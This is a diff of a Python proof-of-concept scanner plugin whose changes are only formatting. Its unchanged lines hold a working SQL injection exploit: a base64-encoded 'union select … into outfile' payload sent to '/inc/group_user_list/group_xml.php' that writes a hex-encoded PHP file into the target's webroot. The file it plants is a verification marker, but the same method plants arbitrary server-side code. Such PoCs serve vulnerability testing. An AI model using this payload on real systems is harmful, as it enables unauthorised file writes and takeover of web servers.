@@ -42,9 +42,10 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
@@ -57,7 +58,7 @@ class Poc(ABPoc):
             payload = '[group]:[1]|[groupid]:[1 union select 0x3c3f706870206563686f206d64352831293b203f3e,2,3,4,5,6,7,8 into outfile \'../webroot/{filename}\']'.format(
                 filename=filename)
             payload = base64.b64encode(payload)
-            #print payload
+            # print payload
             url = arg + '/inc/group_user_list/group_xml.php?par=' + payload
             code, head, res, err, _ = hh.http(url)
 
